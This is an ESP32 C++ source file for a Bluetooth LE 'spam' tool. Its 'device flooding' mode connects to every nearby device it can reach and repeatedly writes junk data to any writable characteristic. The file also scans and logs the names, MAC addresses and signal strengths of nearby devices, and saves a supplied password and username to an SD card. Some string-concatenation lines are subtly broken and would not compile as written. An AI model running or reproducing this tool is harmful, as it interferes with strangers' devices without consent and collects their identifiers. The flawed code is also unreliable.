#include "BLESpam_with_password.h"
#include "SdFat.h"
#include <esp32_smartdisplay.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <TFT_eSPI.h>

// Global TFT Display Object
TFT_eSPI tft = TFT_eSPI(); // Initialize display object

void BLESpamWithPassword::aj_adv_with_password(int spamChoice, const String& password, const String& username) {
    Serial.println("Starting BLE Spam with Password...");

    // Fully functional BLE spam based on choice
    spamBLE(spamChoice);

    // Prepare the data string
    String dataToSave = "Password: " + password;
    if (username.length() > 0) {
        dataToSave += ", Username: " + username;
    }

    // Capture BLE network information
    captureBLEInfo();

    // Save data to SD card
    saveToSD(dataToSave);

    // Display data on screen
    displayToScreen(dataToSave);
}

void BLESpamWithPassword::spamBLE(int choice) {
    Serial.println("Spamming BLE Devices with choice: " + String(choice));

    BLEDevice::init("BLE_Spammer");

    if (choice == 1) {
        // BLE Advertising
        BLEServer* pServer = BLEDevice::createServer();
        BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
        pAdvertising->addServiceUUID("12345678-1234-5678-1234-56789abcdef0"); // Example UUID
        pAdvertising->setScanResponse(true);
        pAdvertising->setMinPreferred(0x06); // Minimum connection interval
        pAdvertising->start();
        Serial.println("Started BLE advertising with custom UUID...");
    } 
    else if (choice == 2) {
        // BLE Notifications
        BLEServer* pServer = BLEDevice::createServer();
        BLEService* pService = pServer->createService("12345678-1234-5678-1234-56789abcdef0");
        BLECharacteristic* pCharacteristic = pService->createCharacteristic(
            "87654321-4321-8765-4321-fedcba987654",
            BLECharacteristic::PROPERTY_READ | BLECharacteristic::PROPERTY_NOTIFY
        );
        pService->start();

        // Notify connected devices periodically
        String notificationData = "Notification from BLE Server";
        for (int i = 0; i < 5; ++i) { // Send 5 notifications
            pCharacteristic->setValue(notificationData + " " + String(i + 1));
            pCharacteristic->notify();
            Serial.println("Sent notification: " + notificationData + " " + String(i + 1));
            delay(500); // Short delay between notifications
        }

        pServer->getAdvertising()->start();
        Serial.println("BLE notifications completed...");
    } 
    else if (choice == 3) {
        // Functional Device Flooding
        BLEScan* pBLEScan = BLEDevice::getScan();
        pBLEScan->setActiveScan(true);
        BLEScanResults scanResults = pBLEScan->start(5); // Scan for 5 seconds

        Serial.println("Flooding nearby devices...");
        for (int i = 0; i < scanResults.getCount(); ++i) {
            BLEAdvertisedDevice advertisedDevice = scanResults.getDevice(i);
            Serial.println("Connecting to device: " + advertisedDevice.getAddress().toString().c_str());
            
            BLEClient* pClient = BLEDevice::createClient();
            if (pClient->connect(advertisedDevice)) {
                Serial.println("Connected to " + advertisedDevice.getAddress().toString().c_str());

                // Discover services and characteristics
                std::map<std::string, BLERemoteService*>* services = pClient->getServices();
                for (auto const& entry : *services) {
                    BLERemoteService* remoteService = entry.second;
                    std::map<std::string, BLERemoteCharacteristic*>* characteristics = remoteService->getCharacteristics();

                    for (auto const& charEntry : *characteristics) {
                        BLERemoteCharacteristic* remoteChar = charEntry.second;
                        if (remoteChar->canWrite()) {
                            // Write actual data repeatedly
                            for (int j = 0; j < 10; ++j) { // Flood with 10 data writes
                                String floodData = "Flood data packet " + String(j + 1);
                                remoteChar->writeValue(floodData.c_str(), floodData.length());
                                Serial.println("Flooded data to characteristic: " + floodData);
                                delay(200); // Delay between floods
                            }
                        }
                    }
                }

                pClient->disconnect();
                Serial.println("Disconnected from device.");
            } else {
                Serial.println("Failed to connect to " + advertisedDevice.getAddress().toString().c_str());
            }
        }
    } else {
        Serial.println("Invalid spam choice. No action taken.");
    }

    BLEDevice::deinit();
}

void BLESpamWithPassword::captureBLEInfo() {
    Serial.println("Capturing BLE network information...");

    BLEDevice::init("");
    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->setActiveScan(true);
    BLEScanResults scanResults = pBLEScan->start(5); // Scan for 5 seconds

    for (int i = 0; i < scanResults.getCount(); ++i) {
        BLEAdvertisedDevice advertisedDevice = scanResults.getDevice(i);
        String deviceInfo = "Device: " + advertisedDevice.getName().c_str() +
                            ", MAC: " + advertisedDevice.getAddress().toString().c_str() +
                            ", RSSI: " + String(advertisedDevice.getRSSI());
        Serial.println(deviceInfo);

        // Save BLE info to SD card
        saveToSD(deviceInfo);

        // Display BLE info to screen
        displayToScreen(deviceInfo);
    }

    BLEDevice::deinit();
}

void BLESpamWithPassword::saveToSD(const String& data) {
    SdFat SD;
    if (SD.begin()) {
        File file = SD.open("/BLE_Info.txt", FILE_WRITE);
        if (file) {
            file.println(data);
            file.close();
            Serial.println("Data saved to SD: " + data);
        } else {
            Serial.println("Error opening SD card file.");
        }
    } else {
        Serial.println("SD card initialization failed.");
    }
}

void BLESpamWithPassword::displayToScreen(const String& data) {
    // Initialize the display (if not already done)
    static bool displayInitialized = false;
    if (!displayInitialized) {
        tft.init();
        tft.setRotation(1); // Landscape orientation
        tft.fillScreen(TFT_BLACK);
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        tft.setTextSize(1); // Set text size to 1x
        displayInitialized = true;
    }

    // Display the data
    static int currentLine = 0; // Track the current display line
    const int maxLines = 10;    // Maximum lines to display before clearing screen
    const int lineHeight = 16;  // Pixel height per line

    if (currentLine >= maxLines) {
        tft.fillScreen(TFT_BLACK); // Clear screen when max lines are reached
        currentLine = 0;           // Reset line count
    }

    tft.setCursor(0, currentLine * lineHeight);
    tft.print(data);

    currentLine++;
    Serial.println("Displayed on screen: " + data);
}
